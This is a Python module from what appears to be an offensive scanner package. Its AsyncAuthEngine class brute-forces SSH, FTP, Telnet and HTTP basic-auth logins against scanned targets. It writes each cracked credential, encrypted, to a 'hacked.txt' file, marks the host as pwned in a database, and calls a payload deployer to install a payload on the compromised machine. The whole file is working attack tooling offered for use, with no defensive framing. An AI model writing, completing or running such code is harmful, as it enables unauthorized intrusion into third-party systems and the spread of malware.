import asyncio
import ftplib
import logging
import os
import socket
import aiohttp
import paramiko
from cryptography.fernet import Fernet

from .utils import TokenBucket
from .database import Database, hash_cred
from .deploy import PayloadDeployer
from .config import CONFIG

logger = logging.getLogger('eni_scanner')

class AsyncAuthEngine:
    def __init__(self, args, db: Database = None, deployer: PayloadDeployer = None,
                 session: aiohttp.ClientSession = None):
        self.args = args
        self.rate = TokenBucket(args.auth_rate, CONFIG['rate_limiting']['burst_capacity'])
        self.lock = asyncio.Lock()
        self.db = db
        self.deployer = deployer
        self.session = session
        self._owns_session = session is None
        if self._owns_session:
            self.session = aiohttp.ClientSession()
        self.cipher = None
        try:
            from cryptography.fernet import Fernet
            key_file = "hacked.key"
            if os.path.exists(key_file):
                with open(key_file, "rb") as f:
                    key = f.read()
            else:
                key = Fernet.generate_key()
                with open(key_file, "wb") as f:
                    f.write(key)
            self.cipher = Fernet(key)
        except ImportError:
            pass

    async def close(self):
        if self._owns_session and self.session:
            await self.session.close()

    def _encrypt_line(self, line: str) -> bytes:
        if self.cipher:
            return self.cipher.encrypt(line.encode())
        else:
            return line.encode()

    async def _try_ssh(self, ip, port, user, pwd):
        loop = asyncio.get_running_loop()
        def _ssh_auth():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, port=port, username=user, password=pwd,
                               timeout=self.args.timeout, allow_agent=False, look_for_keys=False)
                return True
            except Exception:
                return False
            finally:
                client.close()
        return await loop.run_in_executor(None, _ssh_auth)

    async def _try_ftp(self, ip, port, user, pwd):
        loop = asyncio.get_running_loop()
        def _ftp_auth():
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout=self.args.timeout)
                ftp.login(user, pwd)
                ftp.quit()
                return True
            except Exception:
                return False
        return await loop.run_in_executor(None, _ftp_auth)

    async def _try_telnet(self, ip, port, user, pwd):
        loop = asyncio.get_running_loop()
        def _telnet_auth():
            sock = socket.socket()
            sock.settimeout(self.args.timeout)
            try:
                sock.connect((ip, port))
                data = b""
                while b"login:" not in data:
                    chunk = sock.recv(1024)
                    if not chunk:
                        return False
                    data += chunk
                sock.sendall(user.encode() + b"\n")
                data = b""
                while b"Password:" not in data:
                    chunk = sock.recv(1024)
                    if not chunk:
                        return False
                    data += chunk
                sock.sendall(pwd.encode() + b"\n")
                data = b""
                start = time.time()
                while time.time() - start < self.args.timeout:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    if any(p in data for p in (b"#", b"$", b">")):
                        return True
                return False
            except Exception:
                return False
            finally:
                sock.close()
        return await loop.run_in_executor(None, _telnet_auth)

    async def _try_http_basic(self, ip, port, user, pwd, use_ssl=False):
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{ip}:{port}/"
        auth = aiohttp.BasicAuth(user, pwd)
        try:
            async with self.session.get(url, auth=auth, timeout=self.args.timeout, ssl=False) as resp:
                return resp.status == 200
        except Exception:
            return False

    async def run_brute(self, target_results, creds):
        logger.info("Starting brute force on %d targets", len(target_results))
        deployed_count = 0
        for res in target_results:
            attempts = 0
            for u, p in creds:
                if attempts >= self.args.max_attempts:
                    break
                await self.rate.wait()
                success = False
                if res.service == "ssh":
                    success = await self._try_ssh(res.ip, res.port, u, p)
                elif res.service == "ftp":
                    success = await self._try_ftp(res.ip, res.port, u, p)
                elif res.service == "telnet":
                    success = await self._try_telnet(res.ip, res.port, u, p)
                elif res.service == "http":
                    success = await self._try_http_basic(res.ip, res.port, u, p)
                elif res.service == "https":
                    success = await self._try_http_basic(res.ip, res.port, u, p, use_ssl=True)
                if success:
                    async with self.lock:
                        logger.info("SUCCESS: %s:%d -> %s:%s", res.ip, res.port, u, p)
                        line = f"{res.ip}:{res.port}:{u}:{p}"
                        encrypted = self._encrypt_line(line)
                        with open("hacked.txt", "ab") as f:
                            f.write(encrypted + b"\n")
                        if self.db:
                            cred_hash = hash_cred(u, p)
                            await self.db.mark_pwned(res.ip, res.port, res.service, arch=res.arch, cred_hash=cred_hash)
                        if self.deployer:
                            deployed = await self.deployer.deploy(res.ip, res.port, res.service, u, p, res.arch)
                            if deployed:
                                logger.info("Payload deployed on %s:%d", res.ip, res.port)
                                deployed_count += 1
                                if self.db:
                                    await self.db.update_payload_status(res.ip, res.port, res.service, "deployed")
                            else:
                                logger.warning("Payload deployment failed on %s:%d", res.ip, res.port)
                                if self.db:
                                    await self.db.update_payload_status(res.ip, res.port, res.service, "failed")
                    break
                attempts += 1
        logger.info("Brute force finished. Payloads deployed: %d", deployed_count)
